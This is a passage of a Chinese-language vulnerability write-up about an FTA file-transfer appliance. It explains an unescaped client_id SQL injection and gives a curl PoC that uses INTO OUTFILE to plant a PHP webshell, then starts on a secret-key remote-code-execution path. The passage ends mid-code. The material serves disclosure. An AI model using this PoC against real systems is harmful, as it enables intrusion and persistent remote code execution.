    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id  != \&amp;#39;999\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;!(t_mail_server.c_flag &amp;amp; &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CLIENT_DELETED&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_server_id = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;c_manager = \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_name LIKE \&amp;#39;%&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%%&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_user_id LIKE \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; 中會將所傳進的參數進行 SQL 語句的拼裝，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; 為最關鍵的一個函數。&lt;br /&gt;
在 &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; 中可以看到參數皆使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; 來防禦但唯獨缺少 &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;，從原始碼的 Coding Style 觀察猜測應該是開發時的疏忽，因此根據程式流程送出對應的參數即可觸發 SQL Injection。&lt;/p&gt;

&lt;p&gt;此外，在 FTA 中資料庫使用者為 root 具有 FILE_PRIV 權限，因此可使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; 撰寫自己 PHP 代碼至可寫目錄達成遠端代碼執行！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api -d &lt;span class=&quot;s2&quot;&gt;&amp;quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&amp;#39; OR 1=1 LIMIT 1 INTO OUTFILE &amp;#39;/home/seos/courier/themes/templates/.cc.php&amp;#39; LINES TERMINATED BY 0x3c3f...#&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;生成的 PHP 檔案位置在&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;在前個弱點中，要達成遠端代碼執行還有一個條件是要存在可寫目錄，但現實中有機率找不到可寫的目錄放置 Webshell，因此無法從 SQL Injection 達成代碼執行，不過這時有另外一條路可以幫助我們達成遠端代碼執行。&lt;/p&gt;

&lt;p&gt;這個弱點的前提條件是 &lt;strong&gt;已知資料庫中所存的加密 KEY&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;這點對我們來說不是問題，從前面的 SQL Injection 弱點可任意讀取資料庫內容，另外雖然在程式碼中有對參數進行一些過濾，但那些過濾是可以繞過的！&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/(.+)\(.*\)/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_session_cache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_user_contact&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;valid_password&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_update_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_format_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_email_verified&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_exist_allow_direct_download&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_profile_auth&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/[\\\/&amp;quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(count(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, array(&amp;quot;nickname&amp;quot;=&amp;gt;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;))));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p1&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
